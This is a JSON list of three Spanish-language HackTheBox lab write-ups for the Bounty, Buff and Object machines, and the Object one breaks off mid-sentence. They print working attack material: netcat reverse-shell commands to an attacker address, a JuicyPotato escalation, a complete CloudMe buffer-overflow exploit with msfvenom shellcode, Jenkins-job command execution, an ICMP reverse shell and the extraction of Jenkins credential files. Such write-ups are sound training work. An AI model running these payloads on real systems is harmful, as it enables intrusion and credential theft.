[ { "title": "Bounty Writeup [ES] - HackTheBox", "url": "/Bounty-Writeup-HackTheBox/", "categories": "HTB", "tags": "", "date": "2022-06-07 17:00:00 -0400", "snippet": "ResumenEn esta ocasión estaremos resolviendo la máquina Bounty de la plataforma HackTheBox. Bounty es una máquina Windows de dificultad Easy en donde encontraremos una página web simple con una subida de archivos que nos permitirá ejecutar comandos utilizando un archivo con extension .config. Una vez dentro podremos explotar el token SeImpersonatePrivilege para escalar privilegios.EnumeraciónNmapEn esta fase utilizaremos los siguientes scripts personalizados. nmap-scan.sh: Realiza SYN-SCAN a los 65535 puertos y deposita el output al archivo allPorts.gnmap nmap-services.sh: Lee y parsea un archivo “grepeable” de nmap obtiene IP y puertos para realizar un escaneo de servicios a estos últimos. sudo nmap-scan.sh 10.129.130.45 nmap-services.sh allPorts.gnmap# Nmap 7.92 scan initiated Mon Jun 6 17:11:22 2022 as: nmap -sCV -p80 -n -Pn -oN tcp-ports.nmap 10.129.130.45Nmap scan report for 10.129.130.45Host is up (0.14s latency).PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 7.5|_http-server-header: Microsoft-IIS/7.5|_http-title: Bounty| http-methods: |_ Potentially risky methods: TRACEService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Mon Jun 6 17:11:33 2022 -- 1 IP address (1 host up) scanned in 10.38 secondsSolamente se detecta el puerto 80/tcp abierto.Enumeración WebInvestigando la página web nos encontramos con una imagen de merlín y podemos identificar que estamos ante un servidor web IIS 7.5 como fué reportado anteriormente por nmap. Adicionalmente vemos que la web está construida con ASP.NET.Sin mucho más que ver, procederemos a lanzar un escaneo de directorios con gobuster. Encontramos la ruta /UploadedFiles a la cual no podremos acceder de momento.Continuando, y sabiendo que el servidor trabaja con ASP.NET podríamos buscar archivos con extensión .asp y .aspx.Se encuentra el archivo /transfer.aspx el cual resulta ser un panel de subida de archivos.Para hacer una prueba, he creado un archivo llamado “test.txt” y lo he subido. El servidor nos responde con el resultado: Invalid File. Please try again.Si interceptamos la petición, podemos ver que aislado a nuestro archivo, la web está enviando por POST otros tres parámetros. __VIEWSTATE __EVENTVALIDATION btnUploadCon esta información ya podemos empezar a crear un script en python3 que se encargue de chequear las extensiones válidas. Para esto utilizaremos el dicionario raft-medium-extensions-lowercase.txt perteneciente a SecLists.#!/usr/bin/python3from pwn import *from tqdm import tqdmimport requests, signaldef def_handler(sig, frame): print(&quot;\\n[!] Exiting...&quot;) sys.exit(1)#CTRL + Csignal.signal(signal.SIGINT, def_handler)upload_url = &quot;http://10.129.130.45/transfer.aspx&quot;postData = { &quot;__VIEWSTATE&quot; : &quot;/wEPDwUKMTI3ODM5MzQ0Mg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRksqYUgKdyvg/NDIxFs0Vxctek1/A=&quot;, &quot;__EVENTVALIDATION&quot; : &quot;/wEWAgKZuIe3CALt3oXMA5mYEcMuakjG7239K1F3C/62+kJq&quot;, &quot;btnUpload&quot; : &quot;Upload&quot;}allowedExt = []p1 = log.progress(&quot;Testing extension&quot;)with open(&quot;raft-medium-extensions-lowercase.txt&quot;, &quot;r&quot;) as extensions: for line in tqdm(extensions.readlines()): extension = line.strip() p1.status(extension) myFile = {&#39;FileUpload1&#39;: (&#39;test{}&#39;.format(extension), &#39;testing!&#39;)} r = requests.post(upload_url, data=postData, files=myFile) if &#39;Invalid File&#39; not in r.text: allowedExt.append(extension) allowedExtStr = &#39; &#39;.join(str(e) for e in allowedExt) log.info(&quot;Allowed extensions: {}&quot;.format(allowedExtStr)) p1.success(&quot;Completed&quot;) Como se puede apreciar en el script, el contenido de las variables __VIEWSTATE y __EVENTVALIDATION se encuentran hardcodeados, esto es porque en esta web en particular estos valores no cambian, lo normal sería que fueran dinámicos y se deban capturar con expresiones regulares u otro método.Ejecutamos upload.py.Al cabo de unos minutos obtendremos todas las extensiones válidas encontradas dentro del diccionario. De las encontradas .config llama inmediatamente la atención. Según HackTricks es posible ejecutar comandos a través de un archivo con esta extensión.Para esto, crearemos un archivo web.config utilizando una webshell del repositorio PayloadAllTheThings y la subiremos a la máquina.Consola como merlinPara la intrusión, ya asumiendo que podemos ejecutar comandos, nos entablaremos una reverse shell utilizando nc.exe compartido a través de smb. Para localizar el archivo, podemos intuir que este se encuentra en la ruta /uploadedFiles encontrada anteriormente en la fase de enumeración.Paralelamente tendremos: Un recurso compartido en smb llamado shared Una sesión a la escucha de netcat por el puerto 443Ejecutamos \\\\10.10.14.90\\shared\\nc.exe -e cmd 10.10.14.90 443 en la webshell y obtendremos una consola como el usuario merlin.Consola como AdminYa una vez dentro, realizando una enumeración básica, podemos ver que el usuario merlin posee privilegio SeImpersonatePrivilege que nos permite ejecutar comandos como Administrador utilizando herramientas como JuicyPotato o PrintSpoofer.Descargamos JuicyPotato.exe desde su repositorio en Github y lo transferimos a la máquina. Una vez con esto hecho, utilizaremos netcat nuevamente para obtener una nueva consola, esta vez como nt authority\\system. JuicyPotato.exe -l 1337 -t * -p cmd.exe -a &quot;/c \\\\10.10.14.90\\shared\\nc.exe -e cmd 10.10.14.90 1443&quot;Finalmente buscaremos las flags, la de root se encuentra sin problemas en la ubicación usual.La flag del usuario podremos encontrarla con el commando attrib o dir -Force ya que se encuentra oculta.Y eso sería todo para esta máquina. ¡Happy Hacking and keep grinding!Recursos https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/ Abusing Tokens - Hacktricks: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens" }, { "title": "Buff Writeup [ES] - HackTheBox", "url": "/Buff-Writeup-HackTheBox/", "categories": "HTB", "tags": "easy, windows, buffer-overflow", "date": "2022-05-19 17:00:00 -0400", "snippet": "ResumenBuff es una máquina Windows de dificultad Easy de la plataforma de Hack The Box, incluye abuso y explotación de un CMS desactualizado en la intrusión, y un buffer overflow stack-based para la fase de escalada de privlegios.Aprovecharé esta ocasión para practicar y documentar la parte del Buffer Overflow, por lo que no será directamente un writeup de como rootear la máquina, sino una oportunidad para ganar training en esta área.EnumeraciónNMAPEn esta fase utilizaremos los siguientes scripts personalizados. nmap-scan.sh: Realiza SYN-SCAN a los 65535 puertos y deposita el output al archivo allPorts.gnmap nmap-services.sh: Lee y parsea un archivo “grepeable” de nmap obtiene IP y puertos para realizar un escaneo de servicios a estos últimos. sudo nmap-scan.sh buff.htb nmap-services.sh allPorts.gnmapnmap -sCV -p7680,8080 -n -oN tcp-ports.nmap buff.htb -PnStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 18:45 -04Nmap scan report for buff.htbHost is up (0.16s latency).PORT STATE SERVICE VERSION7680/tcp open pando-pub?8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)|_http-open-proxy: Proxy might be redirecting requests|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6|_http-title: mrb3n&#39;s Bro HutService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 87.42 secondsPor lo visto solo disponemos de dos puertos accesibles, el 7680 que no reporta mucha información, y el 8080 en donde existe un servicio web.Enumeración Web - 8080Al ingresar, lo primero que se visualiza es un sitio web que va de la mano con la temática de la máquina, simula ser la página web de un gimnasio.A nivel de las tecnologías utilizadas para crear el sitio, tenemos php y javascript (jquery).Investigando la página web, no vemos mucha información interesante, a excepción de el mensaje Made using Gym Management Software 1.0 en la pestaña Contact, esto inmediatamente nos hace pensar que se utilizó un CMS para construir la web y al ser una máquina de dificultad Easy, es posible que exista alguna forma de explotarlo.Si tomamos ese nombre y buscamos por Gym Management en searchsploit, encontramos lo siguiente.De lo encontrado, llama la atención un script en particular, ya que permite ejecución remota de comandos RCE sin estar autenticado.Consola como ShaunDescargamos el exploit y lo renombramos como exploit.py.Dentro de su código hay una explicación de como se aprovecha de una vulnerabilidad del CMS para subir un archivo .php con una simple webshell para ejecutar comandos en la máquina remota.Ejecutamos y solamente nos solicita proporcionar la dirección URL del sitio web.python2.7 exploit.py http://buff.htb:8080/Enviamos la URL y ya nos conecta a la webshell, en donde ya es posible ejecutar comandos.En otra pestaña compartiré a través de smb el binario de nc.exe para entablar una reverse shell en condiciones.Ahora bien, solo resta inyectar el comando para la reverse shell utilizando el nc.exe compartido previamente. En esta ocasión el comando lo inyectaré directamente con curl, ya que según la documentación del exploit, se ha subido un archivo llamado kamehameha.php, el cual recibe la variable telepathy a través del método GET.En mi caso, la ruta completa es: http://buff.htb:8080/upload/kamehameha.php.curl -s &quot;http://buff.htb:8080/upload/kamehameha.php&quot; -G --data-urlencode &#39;telepathy=\\\\10.10.14.116\\shared\\nc.exe -e cmd 10.10.14.116 443&#39;Ejecutamos y conseguimos una shell como el usuario shaun.Una vez dentro, lo siguiente sería enumerar internamente en búsqueda de métodos para escalar privilegios.Antes de ejecutar herramientas de recon como WinPeas, una simple enumeración del directorio home de nuestro usuario nos revela un .exe interesante.Una búsqueda rápida del binario en google nos indica que es vulnerable a Buffer Overflow y que éste levanta un servicio en el puerto 8888.Al lanzar un netstat dentro de la máquina vemos que existe un servicio ejecutándose bajo ese puerto, pero sólo localmente. Este servicio deberá ser expuesto más adelante con la ayuda de chisel.Si buscamos CloudMe en searchsploit, al igual que con el CMS, vemos que existen exploits públicos para abusar del Buffer Overflow.Considerando que la máquina ya ha sido demasiado fácil y lanzar otro exploit de un tercero no tendría mucho mérito, descargaremos el binario vulnerable y construiremos el exploit de forma manual. Podemos descargarlo desde la máquina Buff, o bien, utilizar el enlace proporcionado en el exploit. searchsploit -x windows/remote/48389.py Enlace: https://www.cloudme.com/downloads/CloudMe_1112.exeConsola como AdministratorBuffer OverflowYa sabemos que CloudMe en su versión 1.11.2 es vulnerable a desbordamiento de buffer, procederemos a crear un ambiente local para explotarlo y depurar la aplicación.Requisitos Una VM de Windows (32 bits) Immunity Debugger + mona.py Abrir puerto 8888 a nivel de red local o crear túnel con chiselPara explotar correctamente un BOF stack-based de 32 bits, el orden será el siguiente: Fuzzear para identificar el offset Tomar control de EIP Identificar badchars Descubrir una operación jmp_esp para asignar al EIP Generar shellcode Juntar todo en un script para explotar remotamente a la máquina víctima Disclaimer: No soy ningún experto en explotación de binarios / bof, pero realizo este tipo de contenido para utilizarlo como ayuda-memoria o para quien pueda serle de utilidad. Trataré explicar paso a paso de la mejor manera posible cada punto sin entrar al detalle de como funciona todo a bajo nivel, para eso al final de este post en Recursos dejaré más información de otras fuentes mucho más detalladas.Preparación entornoEn mi caso estoy utilizando una VM de Windows 10 de 32 bits y ya tengo instalado CloudMe y funcionando correctamente.Antes de iniciar Immunity Debugger, es importante contar con mona instalado, para ésto es simplemente descargarlo desde Github y copiarlo a la carpeta PyCommands dentro del directorio de instalación de Immunity.En mi caso la ruta completa es: C:\\Program Files\\Immunity Inc\\Immunity Debugger\\PyCommandsDentro de Immunity existe una barra inferior que nos permitirá ejecutar comandos, acá es donde podremos llamar a mona.py. Lo primero a configurar es el directorio de trabajo en donde mona enviará el output de los comandos ejecutados. !mona config -set workingfolder c:\\Users\\Cervant\\Desktop\\%p %p creará un directorio con el nombre del programa que estemos depurando.Una vez con esto listo, nos sincronizaremos al proceso de CloudMe.Iremos a File &amp;gt; Attach o pulsaremos CTRL + F1 y nos mostrará una lista de los procesos del sistema. Acá solamente es buscar CloudMe y darle a Attach.Ya en este punto solo resta darle al botón de play para comenzar con la depuración.Importante considerar que cada vez que provoquemos un desbordamiento del buffer, la ejecución de la aplicación se corromperá y cerrará. Aquí tenemos la opción de volver a abrir CloudMe de manera manual y sincronizarnos al proceso con Immunity como fué mostrado anteriormente, o bien presionar &amp;lt;&amp;lt; para que Immunity haga esta tarea por nosotros.Nos aseguramos que Immunity se encuentra sincronizado a CloudMe, en estado Running y continuamos al siguiente paso.Obteniendo el offsetNormalmente crearía un fuzzer automático que vaya incrementando su valor en bytes por cada iteración y que envíe esa data a la app vulnerable, como el que se muestra a continuación.#!/usr/bin/python3from pwn import *host = &quot;127.0.0.1&quot;port = 8888buf = b&quot;&quot;context.log_level = &#39;error&#39;while True: try: buf += b&#39;A&#39;*100 r = remote(host, port) print(&quot;[+] Enviando {} bytes&quot;.format(len(buf))) r.send(buf) r.close() except Exception as e: log.info(str(e))Pero en este caso no tenemos forma de saber si hemos tumbado el servicio remoto, ya que estamos replicando el puerto del servicio con chisel y éste siempre se encontrará disponible, por lo tanto, no obtendremos un problema de conexión como normalmente ocurriría.Lo que haremos a continuación es crear directamente nuestro bof.py e ir modíficandolo a medida que necesitemos hacerlo.Ejecutaremos bof.py.Validamos en la VM Windows e identificamos lo siguiente: El debugger se encuentra en estado “Paused” lo que indica que efectivamente desbordamos el buffer. Hemos sobrescrito el EIP con nuestras “A” (41 en hexadecimal). Tambien vemos que el ESP ha sido sobrescrito.Continuando, ahora debemos buscar un método para calcular exactamente cuanto es el offset, es decir, cuantas “A” debemos inyectar antes de sobrescribir el EIP. Para esto hay una utilidad muy cómoda de la suite de metasploit llamada pattern_create.rb que nos permitirá crear una cadena de caracteres especialmente diseñada.También tendríamos la opcion de generar un patrón desde mona. !mona pc 2000Nos quedaremos con el obtenido desde metasploit, ejecutamos nuevamente y enviamos la nueva cadena como payload. En esta ocasión deberemos tomar nota del valor de EIP para obtener el offset.Tomamos ese valor y de vuelta en nuestra máquina, ejecutaremos pattern_offset.rb entregándole el valor obtenido anteriormente y anteponiendo 0x.Otro método para obtener este valor, es utilizando mona. Al comando es necesario proporcionarle la longitud de la cadena creada anteriormente. !mona findmsp -distance 2000El output muestra exactamente el mismo resultado, 1052 de offset.Lo cómodo de mona es que también guardará el resultado de cada comando en un archivo dentro de la carpeta de trabajoTomar control de EIPAhora que sabemos que el offset es 1052, modificaremos el payload enviado para validar que estamos en lo correcto. Inyectaremos “A” los 1052 primeros bytes, luego “B” los siguientes 4 bytes (EIP) y por último “C” 500 veces que irán a la pila (ESP).Nuestro script quedaría de la siguiente forma.Verificamos desde el debugger y efectivamente vemos que EIP vale “42424242” lo cual corresponde a “BBBB”. También se valida que las “C” fueron inyectadas a ESP.Si en la dirección de ESP damos clic derecho y seleccionamos Follow in Dump, tendremos una vista más cómoda de como se ha inyectado el payload.Identificar badcharsEl próximo paso es identificar los badchars, es decir, carácteres que deben ser omitidos del shellcode para evitar problemas durante su ejecución, uno que debe ser omitido por defecto es el caracter NULL \\x00.Generaremos un bytearray con mona excluyendo de una vez el byte null. !mona bytearray -b &quot;\\x00&quot;Ayudándonos de python haremos lo mismo en nuestro Linux.for x in range(1, 256): print(&quot;\\\\x&quot; + &quot;{:02x}&quot;.format(x), end=&#39;&#39;)print()Ahora la idea es agregar estos badchars a nuestro payload y enviarlos justo después del EIP, de esta manera se inyectarán en ESP y tendremos una forma de validar si existe algún otro badchar.Enviamos y verificamos que hemos correctamente desbordado el buffer e insertado nuestros caracteres dentro de ESP.Esto se puede enumerar manualmente realizando una comparación de cada caracter enviado con cada caracter presente en la pila, si hay alguno que no aparezca acá desde el lado del debugger, quiere decir que es un badchar. Afortunadamente existe una manera más fácil de realizarlo con la ayuda de mona.Utilizaremos el bytearray creado anteriormente y lo compararemos con lo que hay insertado en ESP. Antes de ejecutar deberemos obtener la dirección de ESP.Ahora con todos los datos, comparamos. !mona compare -f C:\\Users\\Cervant\\Desktop\\CloudMe\\bytearray.bin -a 00A3D3D0Como se puede apreciar, recibimos un mensaje que dice “Unmodified” lo que indica que no existe ningún otro badchar para esta aplicación en particular.Obtener JMP ESPAhora toca el turno de obtener un valor válido para EIP, en otras palabras, deberemos encontrar una operación JMP ESP que nos permita acceder al shellcode que insertaremos. !mona jmp -r esp -cpb &quot;\\x00&quot;Nos quedaremos con la dirección 69A5F0EF y la agregaremos al exploit.Generar shellcodePor último, deberemos generar un shellcode que nos permita obtener una reverse shell. msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=192.168.1.142 LPORT=443 EXITFUNC=thread -b &#39;\\x00&#39; -f python -v shellcode Parámetro Definición -p Payload a utilizar -a Arquitectura (x64/x86) -b Badchars a omitir -f Formato en que se exportará el resultado -v Definición de variable LHOST Host que recibirá la conexión (IP) LPORT Puerto por el que se recibirá la conexión msfvenom por defecto nos agregará el encoder shikata_ga_nai y debido a que le agregamos los parámetros -f y -v, nos ha agregado todo el shellcode de una manera cómoda a la variable definida. Considerar que para que el shellcode se decodifique e interprete correctamente, deberemos agregar un “colchón” de nops (\\x90) justo antes.ExploitAgregamos todo lo anterior al script y primero, antes de ejecutarlo contra Buff, lo ejecutaré localmentre contra la VM.¡Y Funciona correctamente!Para la explotación contra la máquina de HTB deberemos generar nuevamente el shellcode indicando la IP de la VPN como LHOST. El script final quedaría de la siguiente forma.#!/usr/bin/python3from pwn import *host = &quot;127.0.0.1&quot;port = 8888offset = 1052junk = b&quot;A&quot;*offset# msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.14.116 LPORT=443 EXITFUNC=thread -b &#39;\\x00&#39; -f python -v shellcodeshellcode = b&quot;&quot;shellcode += b&quot;\\xdd\\xc2\\xd9\\x74\\x24\\xf4\\xb8\\xf7\\xb9\\x52\\xb0&quot;shellcode += b&quot;\\x5a\\x29\\xc9\\xb1\\x52\\x83\\xc2\\x04\\x31\\x42\\x13&quot;shellcode += b&quot;\\x03\\xb5\\xaa\\xb0\\x45\\xc5\\x25\\xb6\\xa6\\x35\\xb6&quot;shellcode += b&quot;\\xd7\\x2f\\xd0\\x87\\xd7\\x54\\x91\\xb8\\xe7\\x1f\\xf7&quot;shellcode += b&quot;\\x34\\x83\\x72\\xe3\\xcf\\xe1\\x5a\\x04\\x67\\x4f\\xbd&quot;shellcode += b&quot;\\x2b\\x78\\xfc\\xfd\\x2a\\xfa\\xff\\xd1\\x8c\\xc3\\xcf&quot;shellcode += b&quot;\\x27\\xcd\\x04\\x2d\\xc5\\x9f\\xdd\\x39\\x78\\x0f\\x69&quot;shellcode += b&quot;\\x77\\x41\\xa4\\x21\\x99\\xc1\\x59\\xf1\\x98\\xe0\\xcc&quot;shellcode += b&quot;\\x89\\xc2\\x22\\xef\\x5e\\x7f\\x6b\\xf7\\x83\\xba\\x25&quot;shellcode += b&quot;\\x8c\\x70\\x30\\xb4\\x44\\x49\\xb9\\x1b\\xa9\\x65\\x48&quot;shellcode += b&quot;\\x65\\xee\\x42\\xb3\\x10\\x06\\xb1\\x4e\\x23\\xdd\\xcb&quot;shellcode += b&quot;\\x94\\xa6\\xc5\\x6c\\x5e\\x10\\x21\\x8c\\xb3\\xc7\\xa2&quot;shellcode += b&quot;\\x82\\x78\\x83\\xec\\x86\\x7f\\x40\\x87\\xb3\\xf4\\x67&quot;shellcode += b&quot;\\x47\\x32\\x4e\\x4c\\x43\\x1e\\x14\\xed\\xd2\\xfa\\xfb&quot;shellcode += b&quot;\\x12\\x04\\xa5\\xa4\\xb6\\x4f\\x48\\xb0\\xca\\x12\\x05&quot;shellcode += b&quot;\\x75\\xe7\\xac\\xd5\\x11\\x70\\xdf\\xe7\\xbe\\x2a\\x77&quot;shellcode += b&quot;\\x44\\x36\\xf5\\x80\\xab\\x6d\\x41\\x1e\\x52\\x8e\\xb2&quot;shellcode += b&quot;\\x37\\x91\\xda\\xe2\\x2f\\x30\\x63\\x69\\xaf\\xbd\\xb6&quot;shellcode += b&quot;\\x3e\\xff\\x11\\x69\\xff\\xaf\\xd1\\xd9\\x97\\xa5\\xdd&quot;shellcode += b&quot;\\x06\\x87\\xc6\\x37\\x2f\\x22\\x3d\\xd0\\x5a\\xb9\\x33&quot;shellcode += b&quot;\\x54\\x33\\xbf\\x4b\\x95\\x78\\x36\\xad\\xff\\x6e\\x1f&quot;shellcode += b&quot;\\x66\\x68\\x16\\x3a\\xfc\\x09\\xd7\\x90\\x79\\x09\\x53&quot;shellcode += b&quot;\\x17\\x7e\\xc4\\x94\\x52\\x6c\\xb1\\x54\\x29\\xce\\x14&quot;shellcode += b&quot;\\x6a\\x87\\x66\\xfa\\xf9\\x4c\\x76\\x75\\xe2\\xda\\x21&quot;shellcode += b&quot;\\xd2\\xd4\\x12\\xa7\\xce\\x4f\\x8d\\xd5\\x12\\x09\\xf6&quot;shellcode += b&quot;\\x5d\\xc9\\xea\\xf9\\x5c\\x9c\\x57\\xde\\x4e\\x58\\x57&quot;shellcode += b&quot;\\x5a\\x3a\\x34\\x0e\\x34\\x94\\xf2\\xf8\\xf6\\x4e\\xad&quot;shellcode += b&quot;\\x57\\x51\\x06\\x28\\x94\\x62\\x50\\x35\\xf1\\x14\\xbc&quot;shellcode += b&quot;\\x84\\xac\\x60\\xc3\\x29\\x39\\x65\\xbc\\x57\\xd9\\x8a&quot;shellcode += b&quot;\\x17\\xdc\\xf9\\x68\\xbd\\x29\\x92\\x34\\x54\\x90\\xff&quot;shellcode += b&quot;\\xc6\\x83\\xd7\\xf9\\x44\\x21\\xa8\\xfd\\x55\\x40\\xad&quot;shellcode += b&quot;\\xba\\xd1\\xb9\\xdf\\xd3\\xb7\\xbd\\x4c\\xd3\\x9d&quot;# jmp_esp: 69A5F0EFpayload = flat(junk, 0x69A5F0EF, asm(&#39;nop&#39;)*20, shellcode)try: r = remote(host, port) print(&quot;[+] Enviando {} bytes!&quot;.format(len(payload))) r.send(payload) r.close()except Exception as e: log.info(str(e))Hacemos un remote port forwarding con la consola de bajo nivel obtenida anteriormente. Desde la máquina local ejecutamos chisel como server y en modo reverse. Desde la Máquina Buff nos conectamos como cliente y realizamos un remote port forwarding del puerto 8888.Y finalmente lanzamos nuestro exploit.Ya a partir de aquí la máquina estaría rooteada y encontrar e ingresar las flag no tiene ciencia alguna. ¡Happy Hacking and keep grinding!Recursos Resolución de Buff (s4vitar): https://youtu.be/TytUFooC3kU Buffer Overflow prep (Tryhackme): https://tryhackme.com/room/bufferoverflowprep Buffer Overflow basics (TCM): https://youtu.be/qSnPayW6F7U https://infosecwriteups.com/stack-based-buffer-overflow-practical-for-windows-vulnserver-8d2be7321af5 https://github.com/joshua17sc/Buffer-Overflows" }, { "title": "Object Writeup [ES] - HackTheBox", "url": "/Object-Writeup-HackTheBox/", "categories": "HTB", "tags": "hard, windows, active-directory, jenkins", "date": "2022-03-14 13:00:00 -0300", "snippet": "ResumenObject es una máquina Windows de dificultad Hard de la plataforma de Hack The Box, incluye conceptos de explotación de Active Directory, Bypass de Firewall y ejecución de jobs en Jenkins.EnumeraciónRustscan - NMAPComo siempre, se iniciará realizando un escaneo general de los 65535 puertos. En este caso se utilizará Rustscan, proporcionando comandos de nmap para realizar el escaneo desde un one-liner. rustscan 10.129.96.147 -- -sCV | tee ports.tcp.nmap.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| || .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |`-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39;Faster Nmap scanning with Rust.________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : --------------------------------------Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan[~] The config file is expected to be at &quot;/home/rustscan/.rustscan.toml&quot;[~] File limit higher than batch size. Can increase speed by increasing batch size &#39;-b 1048476&#39;.Open 10.10.11.132:80Open 10.10.11.132:5985Open 10.10.11.132:8080PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack Microsoft IIS httpd 10.0| http-methods:| Supported Methods: OPTIONS TRACE GET HEAD POST|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Mega Engines5985/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found8080/tcp open http syn-ack Jetty 9.4.43.v20210629|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1| http-robots.txt: 1 disallowed entry|_/|_http-server-header: Jetty(9.4.43.v20210629)|_http-title: Site doesn&#39;t have a title (text/html;charset=utf-8).Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHTTP/80Lo primero que visualizamos es una web que nos indica el dominio object.htb en su pie de página y un enlace hacia su automation server que nos redirige hacia object.htb:8080. Esto inmediatamente lo incorporamos al archivo /etc/hosts. En este punto intenté enumeración de directorios y de subdominios sin resultados satisfactorios.Jenkins - HTTP/8080Bajo este puerto y la URL encontrada anteriormente, encontramos panel de inicio para Jenkins, el cual es un server para automatización y despliegue de tareas.Como no poseemos credenciales, podemos intentar crear un nuevo user. Crearemos el usuario cervant:asd123.Iniciaremos sesión y vemos un enlace para crear un nuevo job.Crearemos un job llamado test de tipo Freestyle project y le daremos OK.Nos llevará a la siguiente página donde definiremos el detalle del job. Haremos scroll hacia abajo y la sección Build es la que nos interesa, ya que ahí es donde podremos inyectar comandos de Windows.Se nos desplegará un cuadro de texto en donde podremos insertar nuestros comandos. Por ahora solo ejecutaremos un whoami para validar la correcta ejecución.Al finalizar y guardar, nos dejará en el “home” de nuestro job, el problema es que en la sección izquierda el botón para ejecutar la tarea no se nos muestra. Esto puede ser debido a que no poseemos los permisos necesarios para una ejecución manual.Si volvemos a la configuración de la tarea, podemos ver una sección llamada Build Triggers. Acá vemos dos opciones que nos pueden servir: Triger builds remotely: Nos permitirá ejecutarlo remotamente utilizando un API-Token. Build Periodically: Permitirá la ejecución por calendarización (cron).Ejecución remota de comandos (RCE)Para ejecutar la tarea automáticamente cada 1 minuto, lo que tendríamos que hacer es agregar * * * * *.Pero esto resulta poco conveniente, ya que nos quita un poco de control. Por lo tanto, procederemos a crear un token y ejecutaremos el job remotamente desde consola.Desde la configuración del Job habilitaremos Triger builds remotely y asignaremos un nombre de token.Posteriormente, iremos a la configuración de usuario y crearemos el token.Ya en tenencia del token, podremos ejecutar la tarea de la siguiente forma: http://[USERNAME]:[TOKEN]@[JENKINS-URL]/job/test/build?token=[TOKEN_NAME]En nuestro caso, lo gatillaremos desde consola utilizando curl.curl -s &quot;http://cervant:11adc4716a1d0e300bdc2ae83b47c8bf14@object.htb:8080/job/test/build?token=CERVANT_TOKEN&quot;No se obtendrá output desde consola, pero inmediatamente veremos la tarea ejecutandose desde la interfaz web.Al cabo de unos segundos finalizará y podremos ir al detalle de la ejecución. Clicaremos sobre el número de tarea en el panel izquierdo e iremos a Console Output.Tenemos ejecución remota de comandos (RCE) con el usuario object\\oliver, en este momento podemos intentar obtener una reverse shell para entrar a la máquina.Modificaremos el job y agregaremos una sentencia para obtener una consola utilizando netcat.Como siempre, compartiremos el binario desde la máquina local a través de smbserver de impacket e iniciaremos un listener.Ejecutaremos la tarea nuevamente y veremos el output. En este caso, vemos que ha finalizado con un error, indicando que la ruta de red no fué encontrada.Esto nos indica que hay alguna regla en el Firewall de la máquina Object que impide conexiones salientes, ya que en ningún momento se recibió una petición hacia el smbserver.Acceso a través de ICMPYa que sabemos que TCP se encuentra bloqueado y muy posiblemente para UDP también sea el caso, podriamos validar si tenemos traza ICMP. Asi que, nuevamente modificamos la tarea y la ejecutaremos para visualizar su output.Efectivamente tenemos conectividad a través de ICMP, por lo que, en lugar de enumerar el sistema a través de Jenkins, entablaremos una reverse shell utilizando este protocolo. En el repositorio de Nishang podemos encontrar un script en powershell que hace exactamente esto. Especificamente nos interesa Invoke-PowerShellIcmp.ps1 si que lo descargaremos y modificaremos.icmpshAhora bien, seguimos teniendo el problema de que no podemos conectarnos a nuestra máquina para obtener el archivo de powershell para su ejecución. Para solucionar esto, convertiremos el contenido del archivo a base64 y lo ejecutaremos con powershell -enc [BASE64] directamente en el job de jenkins.Para preparar la correcta ejecución del script, se debe hacer lo siguiente: Ejecutar el comando sysctl -w net.ipv4.icmp_echo_ignore_all=1 en nuestra máquina local. Descargar la herramienta icmpsh y ejecutarla para obtener el listener de la reverse shell. Copiar la sentencia Invoke-PowerShellIcmp -IPAddress 10.10.14.89 al final del script para lanzar la consola con una única ejecución.Una vez esto se encuentra realizado, eliminaremos los comentarios y líneas vacías del script para compactar su contenido y encodearlo en base64.cat icmp.ps1 | iconv -t utf-16le | base64 -w 0Iremos al job en jenkins y actualizaremos el payload, lo ejecutaremos nuevamente con curl y al cabo de unos segundos obtendremos la shell. Importante notar que una shell a través de ICMP es significativamente más lenta que una tradicional.Consola como OliverUna vez dentro, nos encontraremos en el directorio C:\\Users\\oliver\\AppData\\Local\\Jenkins\\.jenkins\\workspace\\test. Si volvemos al root de Jenkins podremos ubicar los archivos necesarios para descifrar las contraseñas de los usuarios creados. Para esto, requeriremos los archivos credentials.xml, master.key y hudson.util.Secret, el primero se encontrará en el directorio personal del usuario y los otros en el directorio secret.En este caso nos interesan las credenciales del usuario admin.Encontraremos el archivo config.xml el cual es equivalente a lo que necesitamos.Para efectos de simplicidad, y considerando que el archivo hudson.util.Secret es un binario, extraeremos todo utilizando encoding en base64 para luego “decodear” desde nuestra máquina.. config.xml:[convert]::ToBase64String((Get-Content -path users/admin_17207690984073220035/config.xml -Encoding byte)) master.key:[convert]::ToBase64String((Get-Content -path secrets/master.key -Encoding byte)) hudson.util.Secret:[convert]::ToBase64String((Get-Content -path secrets/hudson.util.Secret -Encoding byte))Para realizar el decrypt existen unas cuantas herramientas disponibles, una de ellas se encuentra programada en Go y pertenece al usuario thesubtlety. El repositorio en cuestión es go-decrypt-jenkins desde donde descargaremos un binario compilado para linux.Una vez descargado será muy fácil de utilizar.Introducimos todo lo necesario y obtendremos la contraseña del usuario 